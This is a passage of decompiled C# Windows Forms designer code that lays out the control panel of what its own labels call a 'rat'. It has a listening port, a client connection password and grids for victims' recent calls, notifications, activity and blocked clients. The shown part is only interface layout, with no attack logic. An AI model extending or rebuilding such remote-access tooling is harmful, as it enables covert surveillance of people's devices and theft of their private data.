		this.notifiform.SetToolTip(this.DrakeUIButtonIcon8, "Go to Top");
		this.Panel4.BackColor = System.Drawing.Color.Black;
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel4.Location = new System.Drawing.Point(0, 0);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(8, 569);
		this.Panel4.TabIndex = 20;
		this.serverspanel.BackColor = System.Drawing.Color.Black;
		this.serverspanel.Controls.Add(this.DGVSERVS);
		this.serverspanel.Controls.Add(this.Panel13);
		this.serverspanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.serverspanel.Location = new System.Drawing.Point(124, 34);
		this.serverspanel.Margin = new System.Windows.Forms.Padding(2);
		this.serverspanel.Name = "serverspanel";
		this.serverspanel.Size = new System.Drawing.Size(1065, 569);
		this.serverspanel.TabIndex = 0;
		this.DGVSERVS.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
		this.DGVSERVS.AllowUserToAddRows = false;
		this.DGVSERVS.AllowUserToDeleteRows = false;
		this.DGVSERVS.AllowUserToResizeColumns = false;
		this.DGVSERVS.AllowUserToResizeRows = false;
		dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle16.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle16.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle16.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle16.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVSERVS.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle16;
		this.DGVSERVS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVSERVS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVSERVS.BackgroundColor = System.Drawing.Color.Black;
		this.DGVSERVS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle17.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle17.BackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle17.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle17.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle17.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle17.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle17.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVSERVS.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle17;
		this.DGVSERVS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVSERVS.ColumnHeadersVisible = false;
		this.DGVSERVS.Columns.AddRange(this.statusico, this.portnam, this.DataGridViewTextBoxColumn6);
		this.DGVSERVS.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle18.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle18.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle18.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle18.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle18.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle18.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle18.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVSERVS.DefaultCellStyle = dataGridViewCellStyle18;
		this.DGVSERVS.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVSERVS.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVSERVS.EnableHeadersVisualStyles = false;
		this.DGVSERVS.GridColor = System.Drawing.Color.SkyBlue;
		this.DGVSERVS.Location = new System.Drawing.Point(0, 37);
		this.DGVSERVS.MultiSelect = false;
		this.DGVSERVS.Name = "DGVSERVS";
		this.DGVSERVS.ReadOnly = true;
		this.DGVSERVS.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle19.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle19.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle19.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle19.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		dataGridViewCellStyle19.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVSERVS.RowHeadersDefaultCellStyle = dataGridViewCellStyle19;
		this.DGVSERVS.RowHeadersVisible = false;
		dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle20.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle20.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle20.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle20.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		this.DGVSERVS.RowsDefaultCellStyle = dataGridViewCellStyle20;
		this.DGVSERVS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVSERVS.ShowCellToolTips = false;
		this.DGVSERVS.Size = new System.Drawing.Size(1065, 532);
		this.DGVSERVS.TabIndex = 3;
		this.DGVSERVS.Tag = "b";
		this.statusico.FillWeight = 25f;
		this.statusico.HeaderText = "";
		this.statusico.Name = "statusico";
		this.statusico.ReadOnly = true;
		this.portnam.FillWeight = 108.1146f;
		this.portnam.HeaderText = "Port";
		this.portnam.Name = "portnam";
		this.portnam.ReadOnly = true;
		this.DataGridViewTextBoxColumn6.FillWeight = 161.3487f;
		this.DataGridViewTextBoxColumn6.HeaderText = "Status";
		this.DataGridViewTextBoxColumn6.Name = "DataGridViewTextBoxColumn6";
		this.DataGridViewTextBoxColumn6.ReadOnly = true;
		this.Panel13.BackColor = System.Drawing.Color.Black;
		this.Panel13.Controls.Add(this.DrakeUIAvatar2);
		this.Panel13.Controls.Add(this.rempo);
		this.Panel13.Controls.Add(this.porttext);
		this.Panel13.Controls.Add(this.checksavepass);
		this.Panel13.Controls.Add(this.passtxt);
		this.Panel13.Controls.Add(this.tipkey);
		this.Panel13.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel13.Location = new System.Drawing.Point(0, 0);
		this.Panel13.Margin = new System.Windows.Forms.Padding(2);
		this.Panel13.Name = "Panel13";
		this.Panel13.Size = new System.Drawing.Size(1065, 37);
		this.Panel13.TabIndex = 0;
		this.DrakeUIAvatar2.AvatarSize = 30;
		this.DrakeUIAvatar2.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar2.Location = new System.Drawing.Point(1041, 8);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new System.Drawing.Size(26, 22);
		this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.Symbol = 61525;
		this.DrakeUIAvatar2.SymbolSize = 30;
		this.DrakeUIAvatar2.TabIndex = 55;
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar1";
		this.rempo.AvatarSize = 30;
		this.rempo.BackColor = System.Drawing.Color.Transparent;
		this.rempo.Cursor = System.Windows.Forms.Cursors.Hand;
		this.rempo.FillColor = System.Drawing.Color.Transparent;
		this.rempo.Font = new System.Drawing.Font("Calibri", 12f);
		this.rempo.ForeColor = System.Drawing.Color.SkyBlue;
		this.rempo.Location = new System.Drawing.Point(1009, 8);
		this.rempo.Name = "rempo";
		this.rempo.Size = new System.Drawing.Size(26, 22);
		this.rempo.Style = DrakeUI.Framework.UIStyle.Custom;
		this.rempo.Symbol = 61526;
		this.rempo.SymbolSize = 30;
		this.rempo.TabIndex = 56;
		this.rempo.Text = "DrakeUIAvatar2";
		this.porttext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.porttext.FillColor = System.Drawing.Color.Black;
		this.porttext.Font = new System.Drawing.Font("Calibri", 12f);
		this.porttext.ForeColor = System.Drawing.Color.SkyBlue;
		this.porttext.Location = new System.Drawing.Point(907, 8);
		this.porttext.Margin = new System.Windows.Forms.Padding(4);
		this.porttext.Maximum = 2147483647.0;
		this.porttext.Minimum = -2147483648.0;
		this.porttext.Name = "porttext";
		this.porttext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.porttext.RectColor = System.Drawing.Color.SkyBlue;
		this.porttext.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.porttext.Size = new System.Drawing.Size(92, 27);
		this.porttext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.porttext.TabIndex = 54;
		this.porttext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.porttext.Watermark = "Port";
		this.checksavepass.BackColor = System.Drawing.Color.Transparent;
		this.checksavepass.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checksavepass.Checked = true;
		this.checksavepass.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checksavepass.Font = new System.Drawing.Font("Calibri", 12f);
		this.checksavepass.ForeColor = System.Drawing.Color.SkyBlue;
		this.checksavepass.Location = new System.Drawing.Point(178, 8);
		this.checksavepass.Name = "checksavepass";
		this.checksavepass.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
		this.checksavepass.Size = new System.Drawing.Size(94, 22);
		this.checksavepass.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checksavepass.TabIndex = 53;
		this.checksavepass.Text = "Remember";
		this.passtxt.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.passtxt.FillColor = System.Drawing.Color.SkyBlue;
		this.passtxt.Font = new System.Drawing.Font("Calibri", 12f);
		this.passtxt.ForeColor = System.Drawing.Color.Black;
		this.passtxt.Location = new System.Drawing.Point(37, 8);
		this.passtxt.Margin = new System.Windows.Forms.Padding(4);
		this.passtxt.Maximum = 2147483647.0;
		this.passtxt.Minimum = -2147483648.0;
		this.passtxt.Name = "passtxt";
		this.passtxt.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.passtxt.RectColor = System.Drawing.Color.SkyBlue;
		this.passtxt.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.passtxt.Size = new System.Drawing.Size(135, 27);
		this.passtxt.Style = DrakeUI.Framework.UIStyle.Custom;
		this.passtxt.TabIndex = 51;
		this.passtxt.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.passtxt.Watermark = "Password";
		this.tipkey.AvatarSize = 25;
		this.tipkey.BackColor = System.Drawing.Color.Transparent;
		this.tipkey.FillColor = System.Drawing.Color.Transparent;
		this.tipkey.Font = new System.Drawing.Font("Calibri", 12f);
		this.tipkey.ForeColor = System.Drawing.Color.SkyBlue;
		this.tipkey.Location = new System.Drawing.Point(4, 6);
		this.tipkey.Name = "tipkey";
		this.tipkey.Size = new System.Drawing.Size(26, 26);
		this.tipkey.Style = DrakeUI.Framework.UIStyle.Custom;
		this.tipkey.Symbol = 61529;
		this.tipkey.SymbolSize = 25;
		this.tipkey.TabIndex = 52;
		this.tipkey.Text = "DrakeUIAvatar2";
		this.ToolTip1.SetToolTip(this.tipkey, "connection key : password between client and rat");
		this.notificationspanel.BackColor = System.Drawing.Color.Black;
		this.notificationspanel.Controls.Add(this.callspanel);
		this.notificationspanel.Controls.Add(this.activityzpanel);
		this.notificationspanel.Controls.Add(this.notifispanel);
		this.notificationspanel.Controls.Add(this.Panel12);
		this.notificationspanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.notificationspanel.Location = new System.Drawing.Point(124, 34);
		this.notificationspanel.Margin = new System.Windows.Forms.Padding(2);
		this.notificationspanel.Name = "notificationspanel";
		this.notificationspanel.Size = new System.Drawing.Size(1065, 569);
		this.notificationspanel.TabIndex = 4;
		this.callspanel.Controls.Add(this.DGVCALLS);
		this.callspanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.callspanel.FillColor = System.Drawing.Color.Black;
		this.callspanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.callspanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.callspanel.Location = new System.Drawing.Point(358, 43);
		this.callspanel.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.callspanel.Name = "callspanel";
		this.callspanel.Padding = new System.Windows.Forms.Padding(0, 26, 0, 0);
		this.callspanel.Radius = 55;
		this.callspanel.RectColor = System.Drawing.Color.SkyBlue;
		this.callspanel.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.callspanel.Size = new System.Drawing.Size(349, 526);
		this.callspanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.callspanel.StyleCustomMode = true;
		this.callspanel.TabIndex = 2;
		this.callspanel.Text = "Cobra Recent Calls";
		this.callspanel.TitleColor = System.Drawing.Color.SkyBlue;
		this.DGVCALLS.AllowUserToAddRows = false;
		this.DGVCALLS.AllowUserToDeleteRows = false;
		this.DGVCALLS.AllowUserToResizeColumns = false;
		this.DGVCALLS.AllowUserToResizeRows = false;
		this.DGVCALLS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVCALLS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVCALLS.BackgroundColor = System.Drawing.Color.Black;
		this.DGVCALLS.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVCALLS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		this.DGVCALLS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVCALLS.ColumnHeadersVisible = false;
		this.DGVCALLS.Columns.AddRange(this.DataGridViewImageColumn3, this.DataGridViewTextBoxColumn2);
		dataGridViewCellStyle21.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle21.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle21.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle21.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle21.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle21.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle21.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVCALLS.DefaultCellStyle = dataGridViewCellStyle21;
		this.DGVCALLS.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVCALLS.EnableHeadersVisualStyles = false;
		this.DGVCALLS.Location = new System.Drawing.Point(0, 26);
		this.DGVCALLS.Margin = new System.Windows.Forms.Padding(2);
		this.DGVCALLS.Name = "DGVCALLS";
		this.DGVCALLS.ReadOnly = true;
		this.DGVCALLS.RowHeadersVisible = false;
		this.DGVCALLS.RowTemplate.Height = 24;
		this.DGVCALLS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVCALLS.Size = new System.Drawing.Size(349, 500);
		this.DGVCALLS.TabIndex = 1;
		this.DataGridViewImageColumn3.FillWeight = 33.12183f;
		this.DataGridViewImageColumn3.HeaderText = "image";
		this.DataGridViewImageColumn3.Name = "DataGridViewImageColumn3";
		this.DataGridViewImageColumn3.ReadOnly = true;
		this.DataGridViewTextBoxColumn2.FillWeight = 111.8782f;
		this.DataGridViewTextBoxColumn2.HeaderText = "notifi";
		this.DataGridViewTextBoxColumn2.Name = "DataGridViewTextBoxColumn2";
		this.DataGridViewTextBoxColumn2.ReadOnly = true;
		this.activityzpanel.Controls.Add(this.DGVALRTS);
		this.activityzpanel.Dock = System.Windows.Forms.DockStyle.Right;
		this.activityzpanel.FillColor = System.Drawing.Color.Black;
		this.activityzpanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.activityzpanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.activityzpanel.Location = new System.Drawing.Point(707, 43);
		this.activityzpanel.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.activityzpanel.Name = "activityzpanel";
		this.activityzpanel.Padding = new System.Windows.Forms.Padding(0, 26, 0, 0);
		this.activityzpanel.Radius = 55;
		this.activityzpanel.RectColor = System.Drawing.Color.SkyBlue;
		this.activityzpanel.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.activityzpanel.Size = new System.Drawing.Size(358, 526);
		this.activityzpanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.activityzpanel.StyleCustomMode = true;
		this.activityzpanel.TabIndex = 3;
		this.activityzpanel.Text = "Cobra Recent Activitys";
		this.activityzpanel.TitleColor = System.Drawing.Color.SkyBlue;
		this.DGVALRTS.AllowUserToAddRows = false;
		this.DGVALRTS.AllowUserToDeleteRows = false;
		this.DGVALRTS.AllowUserToResizeColumns = false;
		this.DGVALRTS.AllowUserToResizeRows = false;
		this.DGVALRTS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVALRTS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVALRTS.BackgroundColor = System.Drawing.Color.Black;
		this.DGVALRTS.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVALRTS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		this.DGVALRTS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVALRTS.ColumnHeadersVisible = false;
		this.DGVALRTS.Columns.AddRange(this.DataGridViewImageColumn4, this.DataGridViewTextBoxColumn3);
		dataGridViewCellStyle22.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle22.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle22.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle22.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle22.SelectionBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle22.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle22.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVALRTS.DefaultCellStyle = dataGridViewCellStyle22;
		this.DGVALRTS.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVALRTS.EnableHeadersVisualStyles = false;
		this.DGVALRTS.Location = new System.Drawing.Point(0, 26);
		this.DGVALRTS.Margin = new System.Windows.Forms.Padding(2);
		this.DGVALRTS.Name = "DGVALRTS";
		this.DGVALRTS.ReadOnly = true;
		this.DGVALRTS.RowHeadersVisible = false;
		this.DGVALRTS.RowTemplate.Height = 24;
		this.DGVALRTS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVALRTS.Size = new System.Drawing.Size(358, 500);
		this.DGVALRTS.TabIndex = 1;
		this.DataGridViewImageColumn4.FillWeight = 33.12183f;
		this.DataGridViewImageColumn4.HeaderText = "image";
		this.DataGridViewImageColumn4.Name = "DataGridViewImageColumn4";
		this.DataGridViewImageColumn4.ReadOnly = true;
		this.DataGridViewTextBoxColumn3.FillWeight = 111.8782f;
		this.DataGridViewTextBoxColumn3.HeaderText = "notifi";
		this.DataGridViewTextBoxColumn3.Name = "DataGridViewTextBoxColumn3";
		this.DataGridViewTextBoxColumn3.ReadOnly = true;
		this.notifispanel.Controls.Add(this.DGVNOTF);
		this.notifispanel.Dock = System.Windows.Forms.DockStyle.Left;
		this.notifispanel.FillColor = System.Drawing.Color.SkyBlue;
		this.notifispanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.notifispanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.notifispanel.Location = new System.Drawing.Point(0, 43);
		this.notifispanel.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.notifispanel.Name = "notifispanel";
		this.notifispanel.Padding = new System.Windows.Forms.Padding(0, 26, 0, 0);
		this.notifispanel.Radius = 55;
		this.notifispanel.RectColor = System.Drawing.Color.SkyBlue;
		this.notifispanel.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.notifispanel.Size = new System.Drawing.Size(358, 526);
		this.notifispanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.notifispanel.StyleCustomMode = true;
		this.notifispanel.TabIndex = 1;
		this.notifispanel.Text = "Cobra Recent Notifcations";
		this.notifispanel.TitleColor = System.Drawing.Color.SkyBlue;
		this.notifispanel.TitleInterval = 100;
		this.DGVNOTF.AllowUserToAddRows = false;
		this.DGVNOTF.AllowUserToDeleteRows = false;
		this.DGVNOTF.AllowUserToResizeColumns = false;
		this.DGVNOTF.AllowUserToResizeRows = false;
		this.DGVNOTF.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVNOTF.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVNOTF.BackgroundColor = System.Drawing.Color.Black;
		this.DGVNOTF.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVNOTF.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		this.DGVNOTF.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVNOTF.ColumnHeadersVisible = false;
		this.DGVNOTF.Columns.AddRange(this.cliimg, this.notitext);
		dataGridViewCellStyle23.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle23.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle23.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle23.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle23.SelectionBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle23.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle23.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVNOTF.DefaultCellStyle = dataGridViewCellStyle23;
		this.DGVNOTF.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVNOTF.EnableHeadersVisualStyles = false;
		this.DGVNOTF.Location = new System.Drawing.Point(0, 26);
		this.DGVNOTF.Margin = new System.Windows.Forms.Padding(2);
		this.DGVNOTF.Name = "DGVNOTF";
		this.DGVNOTF.ReadOnly = true;
		this.DGVNOTF.RowHeadersVisible = false;
		this.DGVNOTF.RowTemplate.Height = 24;
		this.DGVNOTF.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVNOTF.Size = new System.Drawing.Size(358, 500);
		this.DGVNOTF.TabIndex = 0;
		this.cliimg.FillWeight = 33.12183f;
		this.cliimg.HeaderText = "image";
		this.cliimg.Name = "cliimg";
		this.cliimg.ReadOnly = true;
		this.notitext.FillWeight = 111.8782f;
		this.notitext.HeaderText = "notifi";
		this.notitext.Name = "notitext";
		this.notitext.ReadOnly = true;
		this.Panel12.BackColor = System.Drawing.Color.Black;
		this.Panel12.Controls.Add(this.DrakeUIButtonIcon11);
		this.Panel12.Controls.Add(this.DrakeUIButtonIcon10);
		this.Panel12.Controls.Add(this.DrakeUIButtonIcon7);
		this.Panel12.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel12.Location = new System.Drawing.Point(0, 0);
		this.Panel12.Margin = new System.Windows.Forms.Padding(2);
		this.Panel12.Name = "Panel12";
		this.Panel12.Size = new System.Drawing.Size(1065, 43);
		this.Panel12.TabIndex = 1;
		this.DrakeUIButtonIcon11.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon11.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon11.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon11.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon11.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon11.Location = new System.Drawing.Point(866, 0);
		this.DrakeUIButtonIcon11.Name = "DrakeUIButtonIcon11";
		this.DrakeUIButtonIcon11.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon11.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon11.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon11.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon11.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon11.Size = new System.Drawing.Size(65, 36);
		this.DrakeUIButtonIcon11.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon11.StyleCustomMode = true;
		this.DrakeUIButtonIcon11.Symbol = 61453;
		this.DrakeUIButtonIcon11.SymbolSize = 45;
		this.DrakeUIButtonIcon11.TabIndex = 35;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon11, "Clear");
		this.DrakeUIButtonIcon10.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon10.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon10.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon10.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon10.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon10.Location = new System.Drawing.Point(146, 0);
		this.DrakeUIButtonIcon10.Name = "DrakeUIButtonIcon10";
		this.DrakeUIButtonIcon10.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon10.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon10.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon10.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon10.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon10.Size = new System.Drawing.Size(65, 36);
		this.DrakeUIButtonIcon10.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon10.StyleCustomMode = true;
		this.DrakeUIButtonIcon10.Symbol = 61453;
		this.DrakeUIButtonIcon10.SymbolSize = 45;
		this.DrakeUIButtonIcon10.TabIndex = 34;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon10, "Clear");
		this.DrakeUIButtonIcon7.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon7.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon7.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon7.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.Location = new System.Drawing.Point(506, 0);
		this.DrakeUIButtonIcon7.Name = "DrakeUIButtonIcon7";
		this.DrakeUIButtonIcon7.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon7.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon7.Size = new System.Drawing.Size(65, 36);
		this.DrakeUIButtonIcon7.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon7.StyleCustomMode = true;
		this.DrakeUIButtonIcon7.Symbol = 61453;
		this.DrakeUIButtonIcon7.SymbolSize = 45;
		this.DrakeUIButtonIcon7.TabIndex = 33;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon7, "Clear");
		this.blockpanel.Controls.Add(this.DGVblocked);
		this.blockpanel.Controls.Add(this.Panel9);
		this.blockpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.blockpanel.FillColor = System.Drawing.Color.SkyBlue;
		this.blockpanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.blockpanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.blockpanel.Location = new System.Drawing.Point(124, 34);
		this.blockpanel.Margin = new System.Windows.Forms.Padding(4);
		this.blockpanel.Name = "blockpanel";
		this.blockpanel.RectColor = System.Drawing.Color.Black;
		this.blockpanel.Size = new System.Drawing.Size(1065, 569);
		this.blockpanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.blockpanel.TabIndex = 15;
		this.blockpanel.Text = "Blocked Clients";
		this.blockpanel.TitleColor = System.Drawing.Color.Black;
		this.blockpanel.TitleHeight = 0;
		this.DGVblocked.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
		this.DGVblocked.AllowUserToAddRows = false;
		this.DGVblocked.AllowUserToDeleteRows = false;
		this.DGVblocked.AllowUserToResizeColumns = false;
		this.DGVblocked.AllowUserToResizeRows = false;
